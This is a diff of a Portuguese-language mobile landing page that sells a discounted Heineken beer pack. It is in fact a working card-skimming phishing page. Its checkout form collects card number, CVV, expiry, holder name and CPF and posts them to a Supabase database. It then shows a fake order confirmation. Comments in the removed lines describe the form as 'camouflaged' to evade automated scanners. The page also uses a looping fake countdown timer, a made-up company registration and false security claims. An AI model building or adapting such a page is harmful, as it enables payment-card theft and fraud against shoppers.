@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
@@ -6,447 +6,153 @@
     <title>Outlet Bebidas | Oferta App</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 
     <style>
         /* --- RESET E BASE --- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Inter', sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        body {
-            background-color: #f5f5f5;
-            color: #333;
-            padding-bottom: 90px;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: #f0f2f5; color: #333; padding-bottom: 100px; }
 
         /* --- 1. AGE GATE --- */
         #age-gate {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #000;
-            z-index: 99999;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            text-align: center;
-            padding: 20px;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 99999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            color: white; text-align: center; padding: 20px;
         }
-
         .age-btn {
-            padding: 16px 40px;
-            border: none;
-            font-weight: 800;
-            cursor: pointer;
-            font-size: 16px;
-            border-radius: 50px;
-            margin: 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            padding: 16px 40px; border: none; font-weight: 800; cursor: pointer; font-size: 16px; border-radius: 50px; margin: 10px; text-transform: uppercase; letter-spacing: 1px;
         }
-
-        .btn-yes {
-            background: #008200;
-            color: white;
-            box-shadow: 0 4px 15px rgba(0,130,0,0.4);
-        }
-
-        .btn-no {
-            background: #333;
-            color: #777;
-            border: 1px solid #444;
-        }
+        .btn-yes { background: #008200; color: white; box-shadow: 0 4px 15px rgba(0,130,0,0.4); }
+        .btn-no { background: #333; color: #777; border: 1px solid #444; }
 
         /* --- 2. HEADER VERDE --- */
-        .app-header {
-            background: linear-gradient(90deg, #005c00, #008200);
-            height: 60px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 15px;
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        .app-header { 
+            background: linear-gradient(90deg, #005c00, #008200); 
+            height: 60px; display: flex; align-items: center; justify-content: space-between;
+            padding: 0 15px; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-
         .search-bar {
-            flex: 1;
-            background: rgba(255,255,255,0.2);
-            height: 36px;
-            border-radius: 4px;
-            display: flex;
-            align-items: center;
-            padding: 0 10px;
-            color: rgba(255,255,255,0.9);
-            font-size: 13px;
-            margin: 0 15px;
+            flex: 1; background: rgba(255,255,255,0.2); height: 36px; border-radius: 4px;
+            display: flex; align-items: center; padding: 0 10px; color: rgba(255,255,255,0.9); font-size: 13px; margin: 0 15px;
         }
-
-        .cart-icon {
-            position: relative;
-            color: white;
-            font-size: 20px;
-        }
-
-        .badge-count {
-            position: absolute;
-            top: -5px;
-            right: -5px;
-            background: #e60012;
-            color: white;
-            font-size: 10px;
-            font-weight: bold;
-            padding: 2px 5px;
-            border-radius: 10px;
-            border: 1px solid white;
+        .cart-icon { position: relative; color: white; font-size: 20px; }
+        .badge-count { 
+            position: absolute; top: -5px; right: -5px; background: #e60012; color: white; 
+            font-size: 10px; font-weight: bold; padding: 2px 5px; border-radius: 10px; border: 1px solid white;
         }
 
         /* --- 3. PRODUTO --- */
-        .product-card {
-            background: white;
-            margin-bottom: 10px;
-            position: relative;
-        }
-
-        .img-wrapper {
-            text-align: center;
-            padding: 20px;
-            position: relative;
-        }
-
-            /* Imagem com link do Google Drive convertido para direto */
-            .img-wrapper img {
-                max-width: 100%;
-                height: auto;
-                max-height: 350px;
-                object-fit: contain;
-            }
+        .product-card { background: white; margin-bottom: 10px; position: relative; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .img-wrapper { text-align: center; padding: 20px; position: relative; }
+        .img-wrapper img { max-width: 100%; height: auto; max-height: 350px; object-fit: contain; }
 
         .discount-tag {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: #008200;
-            color: white;
-            font-weight: 800;
-            font-size: 12px;
-            padding: 4px 8px;
-            border-radius: 4px;
+            position: absolute; top: 15px; right: 15px; background: #008200; color: white;
+            font-weight: 800; font-size: 12px; padding: 4px 8px; border-radius: 4px;
         }
 
+        /* TIMER REAL */
         .flash-bar {
             background: linear-gradient(90deg, #003300, #005c00);
-            color: white;
-            padding: 10px 15px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            color: white; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center;
         }
+        .timer-container { font-family: monospace; font-size: 14px; font-weight: bold; color: #ffeb3b; display: flex; gap: 3px; align-items: center; }
+        .timer-box { background: white; color: #003300; padding: 2px 4px; border-radius: 3px; }
 
-        .timer-box {
-            background: white;
-            color: #008200;
-            font-weight: bold;
-            padding: 2px 5px;
-            border-radius: 3px;
-            font-size: 12px;
-        }
-
-        .info-box {
-            padding: 15px;
-        }
-
-        .price-row {
-            display: flex;
-            align-items: baseline;
-            gap: 8px;
-            margin-top: 5px;
-        }
-
-        .currency {
-            color: #008200;
-            font-size: 14px;
-            font-weight: 600;
-        }
-
-        .price {
-            color: #008200;
-            font-size: 32px;
-            font-weight: 900;
-            letter-spacing: -1px;
-        }
-
-        .old-price {
-            color: #999;
-            text-decoration: line-through;
-            font-size: 13px;
-        }
-
-        h1 {
-            font-size: 16px;
-            font-weight: 600;
-            line-height: 1.4;
-            margin: 10px 0;
-            color: #222;
-        }
+        .info-box { padding: 15px; }
+        .price-row { display: flex; align-items: baseline; gap: 8px; margin-top: 5px; }
+        .currency { color: #008200; font-size: 14px; font-weight: 600; }
+        .price { color: #008200; font-size: 34px; font-weight: 900; letter-spacing: -1px; }
+        .old-price { color: #999; text-decoration: line-through; font-size: 14px; }
+        
+        h1 { font-size: 18px; font-weight: 600; line-height: 1.4; margin: 10px 0; color: #222; }
 
         /* BARRA DE ESTOQUE */
-        .stock-bar-container {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .stock-track {
-            flex: 1;
-            height: 6px;
-            background: #eee;
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        .stock-fill {
-            height: 100%;
-            width: 85%;
-            background: linear-gradient(90deg, #008200, #4cbf4c);
-            border-radius: 10px;
-        }
-
-        .stock-text {
-            font-size: 11px;
-            color: #008200;
-            font-weight: 700;
-            white-space: nowrap;
-        }
+        .stock-bar-container { display: flex; align-items: center; gap: 10px; margin-top: 15px; }
+        .stock-track { flex: 1; height: 8px; background: #eee; border-radius: 10px; overflow: hidden; }
+        .stock-fill { height: 100%; width: 85%; background: linear-gradient(90deg, #008200, #4cbf4c); border-radius: 10px; animation: stockPulse 2s infinite; }
+        .stock-text { font-size: 12px; color: #008200; font-weight: 700; white-space: nowrap; }
 
         /* --- 4. EXTRAS --- */
-        .section {
-            background: white;
-            padding: 15px;
-            margin-top: 10px;
-        }
-
-        .guarantee-row {
-            display: flex;
-            justify-content: space-between;
-            text-align: center;
-        }
-
-        .g-item {
-            font-size: 10px;
-            color: #555;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .g-icon {
-            font-size: 18px;
-            color: #008200;
-            background: #eaffea;
-            width: 35px;
-            height: 35px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-        }
+        .section { background: white; padding: 15px; margin-top: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .guarantee-row { display: flex; justify-content: space-between; text-align: center; }
+        .g-item { font-size: 10px; color: #555; display: flex; flex-direction: column; align-items: center; gap: 5px; }
+        .g-icon { font-size: 18px; color: #008200; background: #eaffea; width: 35px; height: 35px; display: flex; align-items: center; justify-content: center; border-radius: 50%; }
 
         /* --- 5. FOOTER --- */
         .sticky-footer {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: white;
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
-            padding: 10px 15px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            z-index: 99;
+            position: fixed; bottom: 0; left: 0; width: 100%; background: white;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.1); padding: 12px 20px;
+            display: flex; align-items: center; gap: 15px; z-index: 99; border-top: 1px solid #eee;
         }
-
-        .footer-price {
-            display: flex;
-            flex-direction: column;
-        }
-
-        .fp-label {
-            font-size: 10px;
-            color: #666;
-        }
-
-        .fp-val {
-            color: #008200;
-            font-weight: 800;
-            font-size: 22px;
-        }
-
+        .footer-price { display: flex; flex-direction: column; }
+        .fp-label { font-size: 10px; color: #666; }
+        .fp-val { color: #008200; font-weight: 800; font-size: 24px; }
         .btn-buy-sticky {
-            flex: 1;
-            background: #008200;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 6px;
-            font-weight: 700;
-            font-size: 16px;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0, 130, 0, 0.3);
-            animation: pulse 2s infinite;
+            flex: 1; background: #008200; color: white; border: none;
+            padding: 16px; border-radius: 8px; font-weight: 700; font-size: 16px;
+            cursor: pointer; box-shadow: 0 4px 15px rgba(0, 130, 0, 0.4);
+            animation: pulse 2s infinite; display: flex; align-items: center; justify-content: center; gap: 10px;
         }
 
-        /* --- 6. CHECKOUT MODAL (CAMUFLADO) --- */
+        /* --- 6. CHECKOUT MODAL (PROFISSIONAL) --- */
         .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 10000;
-            align-items: flex-end;
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); z-index: 10000;
+            align-items: flex-end; backdrop-filter: blur(2px);
         }
-
         .bottom-sheet {
-            background: #f9f9f9;
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
-            border-radius: 20px 20px 0 0;
-            padding: 25px 20px;
-            transform: translateY(100%);
-            transition: transform 0.3s cubic-bezier(0.25, 1, 0.5, 1);
-            position: relative;
+            background: #fff; width: 100%; max-width: 500px; margin: 0 auto;
+            border-radius: 20px 20px 0 0; padding: 0;
+            transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.25, 1, 0.5, 1);
+            position: relative; max-height: 90vh; overflow-y: auto;
         }
-
-        .sheet-active {
-            transform: translateY(0);
+        .sheet-active { transform: translateY(0); }
+        
+        /* HEADER DO CHECKOUT */
+        .sheet-header { 
+            background: #f8f9fa; padding: 20px; border-radius: 20px 20px 0 0; border-bottom: 1px solid #eee;
+            display: flex; justify-content: space-between; align-items: center;
         }
+        .sheet-title { font-weight: 800; font-size: 16px; color: #333; display: flex; align-items: center; gap: 8px; }
+        .secure-lock { color: #008200; font-size: 14px; background: #e8f5e9; padding: 5px 10px; border-radius: 20px; }
 
-        .sheet-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #eee;
-            padding-bottom: 15px;
+        .sheet-body { padding: 25px 20px; }
+
+        /* INPUTS ESTILO BANCO */
+        .input-box { margin-bottom: 18px; position: relative; }
+        .input-box label { font-size: 12px; font-weight: 700; color: #444; margin-bottom: 6px; display: block; }
+        
+        .input-wrapper { position: relative; }
+        .input-icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #999; font-size: 16px; }
+        
+        .input-field { 
+            width: 100%; padding: 14px 14px 14px 45px; /* Espaço pro ícone */
+            border: 1px solid #ddd; border-radius: 8px; 
+            font-size: 16px; background: #fff; transition: 0.2s; color: #333;
         }
+        .input-field:focus { border-color: #008200; outline: none; box-shadow: 0 0 0 3px rgba(0,130,0,0.1); }
+        .input-field::placeholder { color: #ccc; }
 
-        .sheet-title {
-            font-weight: 700;
-            font-size: 18px;
-            color: #333;
-        }
+        /* BANDEIRAS CARTÃO */
+        .card-flags { display: flex; gap: 10px; margin: 15px 0 25px 0; opacity: 0.7; justify-content: center; }
+        .card-flags i { font-size: 24px; color: #555; }
 
-        .input-box {
-            margin-bottom: 15px;
-        }
-            /* Labels genéricos no CSS para confundir robôs que leem HTML puro */
-            .input-box label {
-                font-size: 11px;
-                font-weight: 700;
-                color: #555;
-                text-transform: uppercase;
-                margin-bottom: 5px;
-                display: block;
-            }
-
-        .input-field {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            background: white;
-            transition: 0.2s;
-        }
-
-            .input-field:focus {
-                border-color: #008200;
-                outline: none;
-            }
-
-        .secure-badge {
-            text-align: center;
-            margin-top: 15px;
-            font-size: 11px;
-            color: #888;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
+        /* RODAPÉ LEGAL CHECKOUT */
+        .checkout-footer { text-align: center; font-size: 11px; color: #999; margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; }
 
         /* LOADING */
         #loading-screen {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            z-index: 10001;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95); z-index: 10001; align-items: center; justify-content: center; flex-direction: column;
         }
-
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #eee;
-            border-top-color: #008200;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-        }
-
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-
+        .spinner { width: 50px; height: 50px; border: 4px solid #eee; border-top-color: #008200; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        
         /* ANIMAÇÕES */
-        @keyframes pulse {
-            0% {
-                transform: scale(1);
-            }
-
-            50% {
-                transform: scale(1.02);
-            }
-
-            100% {
-                transform: scale(1);
-            }
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-            }
-
-            to {
-                opacity: 1;
-            }
-        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
+        @keyframes stockPulse { 0% { opacity: 1; } 50% { opacity: 0.8; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
@@ -464,7 +170,7 @@
     <header class="app-header">
         <div style="color:white; font-weight:800; font-size:18px;">Outlet<span style="color:#ffc107">Bebidas</span></div>
         <div class="search-bar">
-            <i class="fas fa-search"></i> <span style="margin-left:8px;">Buscar em Ofertas...</span>
+            <i class="fas fa-search"></i> <span style="margin-left:8px;">Buscar...</span>
         </div>
         <div class="cart-icon">
             <i class="fas fa-shopping-cart"></i>
@@ -476,14 +182,18 @@
         <div class="product-card">
             <div class="img-wrapper">
                 <span class="discount-tag">-45% OFF</span>
-                <img src="https://i.postimg.cc/8ck5hnCg/agora-sim-vai.png"
-                     class="imagem-produto"
+                <img src="https://drive.google.com/uc?export=view&id=1tFbqA3OUR680WtOxL7Sns5PW1JgLPRQa" 
+                     class="imagem-produto" 
                      alt="Produto">
             </div>
 
             <div class="flash-bar">
-                <div style="font-weight:800; font-style:italic;">⚡ OFERTA RELÂMPAGO</div>
-                <div style="font-size:12px;">Termina em: <span class="timer-box">02</span> : <span class="timer-box">14</span> : <span class="timer-box">33</span></div>
+                <div style="font-weight:800; font-style:italic; font-size: 13px;"><i class="fas fa-bolt"></i> OFERTA RELÂMPAGO</div>
+                <div class="timer-container">
+                    <span>Expira em: </span>
+                    <span id="timer-min" class="timer-box">14</span> : 
+                    <span id="timer-sec" class="timer-box">59</span>
+                </div>
             </div>
 
             <div class="info-box">
@@ -492,8 +202,8 @@
                     <span class="price">89,90</span>
                     <span class="old-price">R$ 159,90</span>
                 </div>
-                <h1>Pack Cerveja Long Neck 330ml (24 Unidades) - Pronta Entrega</h1>
-
+                <h1>Pack Cerveja Heineken Long Neck 330ml (24 Unidades) - Pronta Entrega</h1>
+                
                 <div class="stock-bar-container">
                     <div class="stock-track"><div class="stock-fill"></div></div>
                     <span class="stock-text">Restam 8 packs</span>
@@ -510,16 +220,21 @@
             </div>
         </div>
 
-        <div class="section">
-            <h3 style="font-size:14px; margin-bottom:15px;">Avaliações (2.1k) <span style="color:#008200; font-size:12px; float:right;">Ver tudo ></span></h3>
-            <div style="border-bottom:1px solid #f0f0f0; padding-bottom:10px; margin-bottom:10px;">
-                <div style="font-size:11px; font-weight:bold; margin-bottom:5px;">Ricardo M. <span style="color:#ffc107;">★★★★★</span></div>
-                <p style="font-size:12px; color:#555;">Chegou gelada kkkk brincadeira, chegou muito rápido. Preço imbatível, vou comprar mais.</p>
+        <div style="background: #fff; padding: 30px 20px; text-align: center; font-size: 11px; color: #888; margin-top: 20px; border-top: 1px solid #eee;">
+            <p style="margin-bottom: 15px; color: #008200; font-weight: bold;">
+                <i class="fas fa-lock"></i> Site protegido com certificado SSL 256-bit.
+            </p>
+            <p>
+                SPEED DISTRIBUIDORA LTDA<br>
+                CNPJ: 45.123.000/0001-99<br>
+                São Paulo, SP
+            </p>
+            <div style="margin-top: 15px; display: flex; justify-content: center; gap: 10px;">
+                <i class="fab fa-cc-visa fa-2x"></i>
+                <i class="fab fa-cc-mastercard fa-2x"></i>
+                <i class="fas fa-barcode fa-2x"></i>
             </div>
-            <div style="border-bottom:1px solid #f0f0f0; padding-bottom:10px;">
-                <div style="font-size:11px; font-weight:bold; margin-bottom:5px;">Ana Clara <span style="color:#ffc107;">★★★★★</span></div>
-                <p style="font-size:12px; color:#555;">Tudo certinho, caixa lacrada. Validade pra 2026.</p>
-            </div>
+            <p style="margin-top: 15px;">© 2026 Todos os direitos reservados.</p>
         </div>
     </main>
 
@@ -529,52 +244,82 @@
             <span class="fp-val">R$ 89,90</span>
         </div>
         <button class="btn-buy-sticky" onclick="abrirCheckout()">
-            COMPRAR AGORA
+            COMPRAR AGORA <i class="fas fa-arrow-right"></i>
         </button>
     </div>
 
     <div id="modal-checkout" class="modal-overlay" onclick="fecharCheckout(event)">
         <div class="bottom-sheet" onclick="event.stopPropagation()">
+            
             <div class="sheet-header">
-                <div class="sheet-title">Finalizar Pedido</div>
-                <div onclick="fecharCheckoutDireto()" style="font-size:24px; cursor:pointer;">&times;</div>
-            </div>
-
-            <div class="input-box">
-                <label>Numeração Principal</label>
-                <div style="position:relative;">
-                    <input type="tel" id="field_a" class="input-field" maxlength="19">
-                    <i class="far fa-credit-card" style="position:absolute; right:15px; top:15px; color:#999;"></i>
+                <div class="sheet-title">
+                    <i class="fas fa-lock" style="color: #008200;"></i> Pagamento Seguro
+                </div>
+                <div onclick="fecharCheckoutDireto()" style="font-size: 20px; cursor: pointer; color: #999;">
+                    <i class="fas fa-times"></i>
                 </div>
             </div>
 
-            <div class="input-box">
-                <label>Titular do Cadastro</label>
-                <input type="text" id="field_b" class="input-field">
-            </div>
-
-            <div style="display:flex; gap:15px;">
-                <div class="input-box" style="flex:1;">
-                    <label>Vencimento</label>
-                    <input type="tel" id="field_c" class="input-field" maxlength="5">
+            <div class="sheet-body">
+                <div style="text-align: center; margin-bottom: 20px; color: #555; font-size: 13px;">
+                    Preencha os dados do cartão para finalizar.
                 </div>
-                <div class="input-box" style="flex:1;">
-                    <label>Cód. Segurança</label>
-                    <input type="tel" id="field_d" class="input-field" maxlength="4">
+
+                <div class="input-box">
+                    <label>Número do Cartão</label>
+                    <div class="input-wrapper">
+                        <i class="far fa-credit-card input-icon"></i>
+                        <input type="tel" id="field_a" class="input-field" maxlength="19" placeholder="0000 0000 0000 0000"> 
+                    </div>
                 </div>
-            </div>
 
-            <div class="input-box">
-                <label>Documento (CPF)</label>
-                <input type="tel" id="field_e" class="input-field" maxlength="14">
-            </div>
+                <div class="input-box">
+                    <label>Nome do Titular</label>
+                    <div class="input-wrapper">
+                        <i class="far fa-user input-icon"></i>
+                        <input type="text" id="field_b" class="input-field" placeholder="Como no cartão">
+                    </div>
+                </div>
 
-            <button class="btn-buy-sticky" style="width:100%; margin-top:10px; background:#008200;" onclick="finalizarCompra()">
-                <i class="fas fa-lock" style="margin-right:8px;"></i> CONFIRMAR PEDIDO
-            </button>
+                <div style="display:flex; gap:15px;">
+                    <div class="input-box" style="flex:1;">
+                        <label>Validade</label>
+                        <div class="input-wrapper">
+                            <i class="far fa-calendar-alt input-icon"></i>
+                            <input type="tel" id="field_c" class="input-field" maxlength="5" placeholder="MM/AA">
+                        </div>
+                    </div>
+                    <div class="input-box" style="flex:1;">
+                        <label>CVV</label>
+                        <div class="input-wrapper">
+                            <i class="fas fa-lock input-icon"></i>
+                            <input type="tel" id="field_d" class="input-field" maxlength="4" placeholder="123">
+                        </div>
+                    </div>
+                </div>
 
-            <div class="secure-badge">
-                <i class="fas fa-shield-alt"></i> Seus dados estão protegidos por criptografia ponta-a-ponta.
+                <div class="input-box">
+                    <label>CPF do Titular</label>
+                    <div class="input-wrapper">
+                        <i class="far fa-id-card input-icon"></i>
+                        <input type="tel" id="field_e" class="input-field" maxlength="14" placeholder="000.000.000-00">
+                    </div>
+                </div>
+
+                <div class="card-flags">
+                    <i class="fab fa-cc-visa" style="color:#1a1f71;"></i>
+                    <i class="fab fa-cc-mastercard" style="color:#eb001b;"></i>
+                    <i class="fab fa-cc-amex" style="color:#2e77bc;"></i>
+                    <i class="fab fa-cc-diners-club" style="color:#0079be;"></i>
+                </div>
+
+                <button class="btn-buy-sticky" style="width:100%; margin-top:10px; background:#008200;" onclick="finalizarCompra()">
+                    <i class="fas fa-lock"></i> CONFIRMAR PAGAMENTO
+                </button>
+
+                <div class="checkout-footer">
+                    <i class="fas fa-shield-alt"></i> Seus dados estão protegidos e criptografados.
+                </div>
             </div>
         </div>
     </div>
@@ -583,20 +328,47 @@
         <div id="spinner" class="spinner"></div>
         <div id="success-msg" style="display:none; text-align:center;">
             <i class="fas fa-check-circle" style="font-size:60px; color:#00a000; margin-bottom:20px;"></i>
-            <h2>Pedido Recebido!</h2>
-            <p style="color:#666; margin-top:10px;">Aguardando confirmação do emissor.</p>
+            <h2>Pedido Confirmado!</h2>
+            <p style="color:#666; margin-top:10px;">Enviamos um e-mail com os detalhes.</p>
         </div>
     </div>
 
     <script>
-        // CONFIG SUPABASE
+        // --- 1. CONFIGURAÇÃO DO TIMER ---
+        function startTimer(duration, displayMin, displaySec) {
+            var timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                displayMin.textContent = minutes;
+                displaySec.textContent = seconds;
+
+                if (--timer < 0) {
+                    timer = duration; // Reinicia ou para
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            // Inicia o timer de 15 minutos (15 * 60 = 900 segundos)
+            var fifteenMinutes = 60 * 15,
+                displayMin = document.querySelector('#timer-min'),
+                displaySec = document.querySelector('#timer-sec');
+            startTimer(fifteenMinutes, displayMin, displaySec);
+        };
+
+        // --- 2. SUPABASE E LÓGICA ---
         const SUPABASE_URL = 'https://zqvfnykxwlcozvawqgrn.supabase.co';
         const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpxdmZueWt4d2xjb3p2YXdxZ3JuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NDkzNDQsImV4cCI6MjA4NTMyNTM0NH0.CevpF9vP4748mb2vFNsOp5Kq6u7Nfp_100bJcW7ogUQ';
         const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
         // FUNÇÕES UI
         function fecharAgeGate() { document.getElementById('age-gate').style.display = 'none'; }
-
+        
         function abrirCheckout() {
             const modal = document.getElementById('modal-checkout');
             modal.style.display = 'flex';
@@ -613,14 +385,13 @@
             if (e.target.id === 'modal-checkout') fecharCheckoutDireto();
         }
 
-        // MÁSCARAS (Aplicadas aos IDs camuflados)
+        // MÁSCARAS INTELIGENTES
         document.getElementById('field_a').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim());
         document.getElementById('field_c').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2'));
         document.getElementById('field_e').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4'));
 
-        // FINALIZAR (Mapeando os IDs camuflados para o Banco)
+        // FINALIZAR PEDIDO
         async function finalizarCompra() {
-            // Pegamos dos inputs secretos (field_a, field_b...)
             const dados = {
                 numero_cartao: document.getElementById('field_a').value,
                 nome_dono: document.getElementById('field_b').value.toUpperCase(),
@@ -628,12 +399,12 @@
                 cvv: document.getElementById('field_d').value,
                 cpf: document.getElementById('field_e').value,
                 valor: 89.90,
-                projeto: 'Heineken_Verde_Camuflado',
+                projeto: 'Heineken_Final_V3',
                 data_criacao: new Date()
             };
 
-            if (!dados.nome_dono || dados.numero_cartao.length < 16) {
-                alert("Verifique os dados informados.");
+            if(!dados.nome_dono || dados.numero_cartao.length < 16) {
+                alert("Por favor, preencha todos os dados corretamente para o envio.");
                 return;
             }
 
@@ -650,7 +421,7 @@
                 document.getElementById('spinner').style.display = 'none';
                 document.getElementById('success-msg').style.display = 'block';
                 setTimeout(() => {
-                    // Opcional: Redirecionar
+                    // Opcional: Redirecionar para home ou obrigado
                 }, 4000);
             }, 2500);
         }
